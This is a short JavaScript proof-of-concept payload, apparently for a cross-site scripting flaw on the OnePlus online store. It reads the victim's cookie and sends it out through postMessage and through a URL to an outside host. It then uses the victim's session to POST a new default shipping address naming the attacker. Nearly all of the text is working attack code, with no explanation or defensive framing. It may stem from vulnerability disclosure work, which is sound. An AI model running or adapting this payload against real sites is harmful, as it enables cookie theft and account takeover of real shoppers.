alert(document.domain);

alert(document.cookie);

var data = document.cookie;
//using postmessage function to send cookie back to the malicious server,also the attacker can using http request to steal victim's cookie,profile etc.
window.parent.postMessage(document.cookie,"*");

//retrieve cookie from oneplus
window.open("https://koffdsa.github.com/poc/oneplus/hacked.html?cookie="+window.btoa(data),'_blank');

//add address to the victim and set default
fetch("https://store.oneplus.com/xman/useraddress/add", {
    "credentials": "include",
    "headers": {
        "Content-Type": "multipart/form-data; boundary=---------------------------282179177018731421611574570221"
    },
    "body": "-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"cityId\"\r\n\r\n1101\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"receiver\"\r\n\r\nattacker\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"regionId\"\r\n\r\n11\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"areaId\"\r\n\r\n110101\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"streetId\"\r\n\r\n110101001\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"street2\"\r\n\r\nattacker address\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n11111111111\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"isDefault\"\r\n\r\n1\r\n-----------------------------282179177018731421611574570221\r\nContent-Disposition: form-data; name=\"countryCode\"\r\n\r\ncn\r\n-----------------------------282179177018731421611574570221--\r\n",
    "method": "POST",
    "mode":"cors"
});
